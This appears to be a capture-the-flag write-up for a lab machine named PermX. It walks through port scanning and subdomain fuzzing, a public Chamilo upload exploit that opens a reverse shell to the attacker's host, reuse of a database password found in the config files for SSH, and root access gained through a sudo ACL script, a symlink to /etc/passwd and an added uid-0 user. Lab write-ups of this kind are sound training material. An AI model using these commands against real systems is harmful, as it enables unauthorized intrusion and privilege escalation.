Running initial Nmap scan to discover all open ports.
```shell-session
# nmap -T4 -p- 10.10.11.23 -oN nmap_all_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 12:36 IDT
Warning: 10.10.11.23 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.23
Host is up (0.14s latency).
Not shown: 65498 closed tcp ports (reset), 35 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 708.58 seconds
```

Starting a service scan with the open ports.
```shell-session
# Nmap 7.94SVN scan initiated Fri Aug 16 12:49:22 2024 as: nmap -sV -sC -p 80,22 -oN nmap_open_ports 10.10.11.23
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 16 12:49:34 2024 -- 1 IP address (1 host up) scanned in 12.07 seconds
```

Fuzzing for subdomains, we find an lms subdomain.
```shell-session
# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb -H 'Host: FUZZ.permx.htb' -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 148ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 176ms]
:: Progress: [4989/4989] :: Job [1/1] :: 260 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
```

Visiting the website we see a Chamilo application.
![[Pasted image 20240816125951.png]]

A public exploit can be found [here](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc).

Used the following commands to download the exploit.
```shell-session
# git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc
# cd chamilo-lms-unauthenticated-big-upload-rce-poc
# pip install -r requirements.txt
```

Next running the exploit with the scan mode, it says the target is likely vulnerable.
```shell-session
# python3 main.py -u http://lms.permx.htb/ -a scan
[+] Target is likely vulnerable. Go ahead. [+]
```

Let's now start a netcat listener.
```shell-session
# nc -nlvp 6666
listening on [any] 6666 ...
```

Next running the exploit with the revshell mode to get a reverse shell.
```shell-session
# python3 main.py -u http://lms.permx.htb/ -a revshell
Enter the name of the webshell file that will be placed on the target server (default: webshell.php):
Enter the name of the bash revshell file that will be placed on the target server (default: revshell.sh):
Enter the host the target server will connect to when the revshell is run: 10.10.14.88
Enter the port on the host the target server will connect to when the revshell is run: 6666
[!] BE SURE TO BE LISTENING ON THE PORT THAT YOU DEFINED [!]

[+] Execution completed [+]

You should already have a revserse connection by now.
```

We got a shell.
```shell-session
# nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.23] 47020
bash: cannot set terminal process group (1174): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

Going to the opt we can see a script file.
```shell-session
www-data@permx:/opt$ ls
acl.sh
```

Listing the file content, it seems like the script will give the requested user the requested permissions for a specific file in the /home/mtz/ directory.
```shell-session
www-data@permx:/opt$ cat acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Searching for the db_password string, we find something that looks like a password.
```shell-session
www-data@permx:/var/www/chamilo$ grep -r db_password
main/inc/global.inc.php:    'password' => $_configuration['db_password'],
main/inc/global.inc.php:    'password' => $_configuration['db_password'],
main/inc/global-min.inc.php:    'password' => $_configuration['db_password'],
main/install/configuration.dist.php:$_configuration['db_password'] = '{DATABASE_PASSWORD}';
main/install/install.lib.php:        $dbPassForm = $_configuration['db_password'];
app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
plugin/migrationmoodle/src/MigrationMoodlePlugin.php:            'db_password' => 'text',
plugin/migrationmoodle/src/MigrationMoodlePlugin.php:            'password' => $this->get('db_password'),
plugin/migrationmoodle/lang/english.php:$strings['db_password'] = 'Moodle DB password';
plugin/migrationmoodle/lang/french.php:$strings['db_password'] = 'Mot de passe BdD Moodle';

<SNIP>
```

We can now SSH as the mtz user.
```shell-session
# ssh mtz@10.10.11.23                    
The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.23' (ED25519) to the list of known hosts.
mtz@10.10.11.23's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

<SNIP>

mtz@permx:~$ cat user.txt
a971716c2a5713f4c92dd23c8f18fdfe
```

Checking sudo permissions, we can run the acl.sh file from before with sudo permissions.
```shell-session
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

Using symbolic link, we can gain full access with the /etc/passwd file with the script.
```shell-session
mtz@permx:/tmp$ ln -s /etc/passwd /home/mtz/link
mtz@permx:/tmp$ sudo /opt/acl.sh mtz rwx /home/mtz/link
```

We can add the following line to the end of the /etc/passwd file in order to add a new root user.
```
newroot:x:0:0::/root:/bin/bash
```

Let's generate a password hash for the new root user, then place it in place of x.
```shell-session
mtz@permx:/tmp$ python3 -c 'import crypt; print(crypt.crypt("password", crypt.mksalt(crypt.METHOD_SHA512)))'
$6$RjQCnPWlSjAzcqft$kvc7AQfsRGz2flfle.pvFBaZFhGVyzOZbx7hrs9Wsi747IMfGLOzOAkQH7wQjdCVFkmrPQqASbGQFtTtHxeNg/
```

newroot:$6$RjQCnPWlSjAzcqft$kvc7AQfsRGz2flfle.pvFBaZFhGVyzOZbx7hrs9Wsi747IMfGLOzOAkQH7wQjdCVFkmrPQqASbGQFtTtHxeNg/:0:0::/root:/bin/bash